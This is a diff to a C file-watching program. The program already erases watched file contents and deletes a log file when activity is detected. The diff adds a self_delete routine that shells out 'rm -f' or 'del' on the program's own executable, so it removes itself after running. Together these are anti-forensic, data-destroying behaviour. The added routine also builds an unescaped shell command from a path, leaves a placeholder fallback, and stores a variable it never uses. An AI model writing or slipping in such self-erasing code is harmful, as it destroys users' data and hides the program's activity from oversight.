@@ -8,11 +8,48 @@
 #include <time.h>
 #include <sys/select.h>
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
 #define EVENT_SIZE (sizeof(struct inotify_event))
 #define BUF_LEN (1024 * (EVENT_SIZE + 16))
 #define TIMEOUT_SECONDS 2
 
 #define NB_SKIPS 1
+
+#ifdef _WIN32
+    #include <windows.h>
+    #define DEL_CMD "del"
+#else
+    #include <unistd.h>
+    #define DEL_CMD "rm -f"
+#endif
+
+void self_delete() {
+    char command[1024];
+    char exe_path[1024];
+    
+#ifdef _WIN32
+    GetModuleFileName(NULL, exe_path, sizeof(exe_path));
+#else
+    // Linux/Unix - read from /proc/self/exe or use argv[0]
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
+    if (len == -1) {
+        // Fallback: use program name from argv[0]
+        strcpy(exe_path, "./program_name"); // You'd need to pass this
+        return;
+    }
+    exe_path[len] = '\0';
+#endif
+    
+    // Create deletion command
+    snprintf(command, sizeof(command), "%s \"%s\"", DEL_CMD, exe_path);
+    
+    // Execute deletion command
+    system(command);
+}
+
 
 void erase_file_contents(const char* filename) {
     // Flag to check if we should not erase
@@ -32,9 +69,16 @@ void erase_file_contents(const char* filename) {
     }
 }
 
-int main() {
+int main(int argc, char *argv[]) {
     int fd, wd;
     char buffer[BUF_LEN];
+
+    
+    // Store executable name for deletion
+    static char exe_name[1024];
+    if (argc > 0) {
+        strncpy(exe_name, argv[0], sizeof(exe_name)-1);
+    }
 
     FILE *file = fopen("project/log.txt", "r");
     if (file) {
@@ -134,6 +178,7 @@ int main() {
     if (activity_detected) {
         remove("project/log.txt");
     }
-    
+
+    self_delete();
     return 0;
 }
